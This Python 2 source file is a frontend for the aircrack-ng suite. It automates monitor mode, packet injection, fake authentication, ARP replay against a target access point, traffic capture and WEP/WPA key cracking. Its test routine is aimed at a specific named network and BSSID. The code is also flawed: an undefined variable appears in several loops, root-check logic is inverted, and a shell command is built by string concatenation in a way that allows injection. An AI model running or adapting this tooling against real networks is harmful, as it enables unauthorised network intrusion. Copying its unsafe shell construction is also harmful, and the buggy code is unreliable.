#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright (C) 2014 Roberto Metere
#
# Aircrack module (simple frontend)

import sys, os, subprocess, time
import re
from abc import ABCMeta, abstractmethod
from WifiNetwork import WifiNetwork # Useless import - just for testing

currentTimeMillis = lambda: int(round(time.time() * 1000))

class Process(object):
  __metaclass__ = ABCMeta
  
  @abstractmethod
  def stdoutReady(self): pass
  
  @abstractmethod
  def stderrReady(self): pass
  
  @abstractmethod
  def run(self, cmd): pass
  
  @abstractmethod
  def stop(self): pass

# Turn wireless cards into monitor mode
class AirMonitor(object):
  binary = None
  
  def __init__ (self, binary):
    self.setBinary(binary)

  def isRunAsRoot(self, output):
    return ("root" not in output)

  def setBinary(self, binary):
    self.binary = binary

  def check(self, kill = True):
    cmd = [self.binary, "check"]
    if kill:
      cmd = cmd + ["kill"]
      
    try:
      fb = subprocess.check_output(cmd)

      # Check root
      if not self.isRunAsRoot(fb):
        raise OSError(fb.strip())
    except OSError as e:
      print "AirMonitor stop error. ", e
    return fb.strip()

  def stop(self, interface):
    cmd = [self.binary, "stop", interface]
    
    try:
      fb = subprocess.check_output(cmd)

      # Check root
      if self.isRunAsRoot(fb):
        for l in fb.splitlines():
          if re.search('removed', l) is not None:
            return True
        return False
      else:
        raise OSError(fb.strip())
    except OSError as e:
      print "AirMonitor stop error. ", e
      return False

  def detect(self):
    try:
      fb = subprocess.check_output([self.binary])

      # Check root
      if self.isRunAsRoot(fb):
        # Get the monitor interface(s)
        mons = []
        for l in fb.splitlines():
          mon = re.search('mon[0-9]', l)
          if mon is not None:
            mons = mons + [mon.group(0)]
        return mons
        raise OSError(fb.strip())
    except OSError as e:
      print "AirMonitor detect error. ", e
    except subprocess.CalledProcessError as e:
      print "AirMonitor detect issue. ", e
    return []

  def start(self, interface, channel = None):
    cmd = [self.binary, "start", interface]
    if channel is not None:
      cmd = cmd + [ str(channel) ]
    
    try:
      # Just be sure interface is down
      subprocess.check_output(["ifconfig", interface, "down"])
      
      # Run start monitor command
      fb = subprocess.check_output(cmd)

      # Check root
      if self.isRunAsRoot(fb):
        # Get the monitor interface(s)
        mons = []
        for l in fb.splitlines():
          mon = re.search('mon[0-9]', l)
          if mon is not None:
            # Due to a bug, set the channel manually (where?)
            if channel is not None:
              for c in [ str((int(channel) + 1) % 11), str(channel)]:
                subprocess.check_output(["iwconfig", interface, "channel", c])
                subprocess.check_output(["iwconfig", mon.group(0), "channel", c])
            mons = mons + [mon.group(0)]
        return mons
      else:
        raise OSError(fb.strip())
    except OSError as e:
      print "AirMonitor start error. ", e
    except subprocess.CalledProcessError as e:
      print "AirMonitor start issue. ", e
    return []

# Inject packets into a wireless network to generate traffic
class AirReplay(object):
  binary = None
  proc = None
  
  def __init__ (self, binary):
    self.setBinary(binary)

  def setBinary(self, binary):
    self.binary = binary

  def isRunAsRoot(self, output):
    return ("root" not in output)

  # aireplay-ng -9 -e teddy -a 00:14:6C:7E:40:80  ath0
  def testInjection(self, network, interface):
    cmd = [ self.binary, "-9", "-e", network.ssid, "-a", network.bssid, interface, "--ignore-negative-one" ]
    
    try:
      fb = subprocess.check_output(cmd)
      
      # Check root
      if self.isRunAsRoot(fb):
        return 'Injection is working' in fb
      else:
        raise OSError(fb.strip())
    except OSError as e:
      print "AirReplay testInjection failure. ", e
    except subprocess.CalledProcessError as e:
      print "AirReplay testInjection error. ", e
    return False

  # aireplay-ng -1 6000 -o 1 -q 10 -e teddy -a 00:14:6C:7E:40:80 -h 00:0F:B5:88:AC:82 ath0
  def fakeAuthentication(self, network, interface, reauthenticateDelay = 300, packets = 1, keepAlive = 10, process = None):
    cmd = [ self.binary, "-1", str(reauthenticateDelay), "-o", str(packets), "-q", str(keepAlive), "-e", network.ssid, "-a", network.bssid, "-h", network.discoveredBy, "--ignore-negative-one", interface ]
    
    try:
      if isinstance(process, Process) :
        process.run(cmd)
      else:
        self.proc = subprocess.Popen(cmd, stdout = subprocess.PIPE, stderr = subprocess.PIPE)
        while self.proc.poll() is None:
          line = self.proc.stdout.readline()
          
          if line is not None:
            # Check root
            if not self.isRunAsRoot(fb):
              self.proc.terminate()
              raise OSError(line.strip())
            print line.strip()
            sys.stdout.flush()
    except OSError as e:
      print "AirReplay fakeAuthentication failure. ", e
    except subprocess.CalledProcessError as e:
      print "AirReplay fakeAuthentication error. ", e

  # aireplay-ng -3 -b 00:14:6C:7E:40:80 -h 00:0F:B5:88:AC:82 ath0
  def arpInjection(self, network, interface, reauthenticateDelay = 300, packets = 1, keepAlive = 10, process = None):
    cmd = [ self.binary, "-3", "-b", network.bssid, "-h", network.discoveredBy, "--ignore-negative-one", interface ]
    
    try:
      if isinstance(process, Process) :
        process.run(cmd)
      else:
        self.proc = subprocess.Popen(cmd, stdout = subprocess.PIPE, stderr = subprocess.PIPE)
        while self.proc.poll() is None:
          line = self.proc.stdout.readline()
          
          if line is not None:
            # Check root
            if not self.isRunAsRoot(fb):
              self.proc.terminate()
              raise OSError(line.strip())
            print line.strip()
            sys.stdout.flush()
    except OSError as e:
      print "AirReplay fakeAuthentication failure. ", e
    except subprocess.CalledProcessError as e:
      print "AirReplay fakeAuthentication error. ", e

# A wireless packet capture tool for aircrack-ng
class AirOutputDump(object):
  binary = None
  output = "dump"
  
  def __init__ (self, binary):
    self.setBinary(binary)

  def setBinary(self, binary):
    self.binary = binary

  def isRunAsRoot(self, output):
    return ("root" not in output)

  # airodump-ng -c 9 --bssid 00:14:6C:7E:40:80 -w output ath0
  def dump(self, network, interface, dumpDir = None, output = None, process = None):
    if output is not None:
      self.output = output
    
    # Create dump working directory
    if dumpDir is not None and not os.path.exists(dumpDir):
      try:
        os.makedirs(dumpDir)
      except OSError as e:
        print "AirOutputDump dump error. ", e
        return
    
    # Command
    cmd = [self.binary, "-c", str(network.channel), "--bssid", network.bssid, "-w", dumpDir + "/" + self.output, "--ignore-negative-one", interface]
    
    # Dump!
    try:
      if isinstance(process, Process) :
        process.run(cmd)
      else:
        self.proc = subprocess.Popen(cmd, stdout = subprocess.PIPE, stderr = subprocess.PIPE)
        while self.proc.poll() is None:
          line = self.proc.stderr.readline()
          if line is not None:
            # Check root
            if not self.isRunAsRoot(fb):
              self.proc.terminate()
              raise OSError(line.strip())
            print line.strip()
            sys.stdout.flush()
    except OSError as e:
      print "AirOutputDump dump failure. ", e
    except subprocess.CalledProcessError as e:
      print "AirOutputDump dump error. ", e



# A 802.11 WEP / WPA-PSK key cracker
class AirCrack(object):
  binary = None
  retryDelay = 10 # seconds
  
  def __init__ (self, binary):
    self.setBinary(binary)

  def setBinary(self, binary):
    self.binary = binary

  # aircrack-ng -b 00:14:6C:7E:40:80 output*.cap
  def crack(self, network, crackDir = None, output = None, process = None):
    if output is not None:
      cmd = ["sh", "-c"]
      
      if crackDir is not None:
        if not os.path.exists(crackDir) or os.path.isfile(crackDir):
          print "AirCrack crack error. Unable to find dump directory."
          return 2
        else:
          while os.listdir(crackDir) == 0:
            time.sleep(self.retryDelay)
          cmd = cmd + [self.binary + " -b " + network.bssid + " " + crackDir + "/" + output + "*.cap"]
      else:
        cmd = cmd + [self.binary + " -b " + network.bssid + " " + output + "*.cap"]
      
      if isinstance(process, Process) :
        process.run(cmd)
      else:
        self.proc = subprocess.Popen(cmd, stdout = subprocess.PIPE, stderr = subprocess.PIPE)
        while self.proc.poll() is None:
          line = self.proc.stderr.readline()
          if line is not None:
            print line.strip()
            sys.stdout.flush()
      return 0 # Were running
    else:
      return 1 # Error


# aircrack-ng is an 802.11 WEP and WPA/WPA2-PSK key cracking program.
# It can recover the WEP key once enough encrypted packets have been cap‐
# tured with airodump-ng. This part of the aircrack-ng  suite  determines
# the  WEP key using two fundamental methods. The first method is via the
# PTW approach (Pyshkin, Tews, Weinmann). The main advantage of  the  PTW
# approach  is  that  very few data packets are required to crack the WEP
# key. The second method is the FMS/KoreK method.  The  FMS/KoreK  method
# incorporates  various  statistical  attacks to discover the WEP key and
# uses these in combination with brute forcing.
# Additionally, the program offers a dictionary  method  for  determining
# the WEP key. For cracking WPA/WPA2 pre-shared keys, a wordlist (file or
# stdin) or an airolib-ng has to be used.
class AircrackNG(object):
  binDir = None
  sbinDir = None
  workDir = None
  mon = None
  replay = None
  odump = None
  cracker = None
  timeStart = None
  timeStop = None
  
  def __init__ (self):
    if (os.name == "posix"):
      try:
        self.binDir = "/".join(subprocess.check_output(["which", "aircrack-ng"]).split("/")[:-1])
        self.sbinDir = "/".join(subprocess.check_output(["which", "airmon-ng"]).split("/")[:-1])
        self.workDir = "/tmp/swc"
        if not os.path.exists(self.workDir):
          os.makedirs(self.workDir)
      except OSError as e:
        self.binDir = "/usr/bin"
        self.sbinDir = "/usr/sbin"
        self.workDir = "/tmp"
        
    self.mon = AirMonitor(self.sbinDir + "/airmon-ng")
    self.replay = AirReplay(self.sbinDir + "/aireplay-ng")
    self.odump = AirOutputDump(self.sbinDir + "/airodump-ng")
    self.cracker = AirCrack(self.binDir + "/aircrack-ng")
    
  def setBinDir(self, bindir):
    self.binDir = bindir
    self.cracker.setBinary(self.binDir + "/aircrack-ng")
    
  def setSbinDir(self, sbindir):
    self.sbinDir = sbindir
    self.mon.setBinary(self.sbinDir + "/airmon-ng")
    self.replay.setBinary(self.sbinDir + "/aireplay-ng")
    self.odump.setBinary(self.sbinDir + "/airodump-ng")
    
  def startCrackTime(self):
    self.timeStart = currentTimeMillis();
    
  def stopCrackTime(self):
    self.timeStop = currentTimeMillis();
    
  def getElapsedTimeMillis(self):
    if self.timeStop is not None and self.timeStart is not None:
      return self.timeStop - self.timeStart
    else:
      return 0

# Test module
def test():
  #Just test
  aircrack = AircrackNG()
  mons = aircrack.mon.start("wlan2", 6)
  mons = ["mon0"]

  if len(mons) > 0:
    network = WifiNetwork()
    network.setSSID("Alice-92313723")
    network.setBSSID("00:1C:A2:D1:55:FC")
    print aircrack.replay.testInjection(network, mons[0])
    print aircrack.odump.dump(network, mons[0])

  #Stop monitors
  for mon in mons:
    aircrack.mon.stop(mon)

if __name__ == '__main__':
    test()

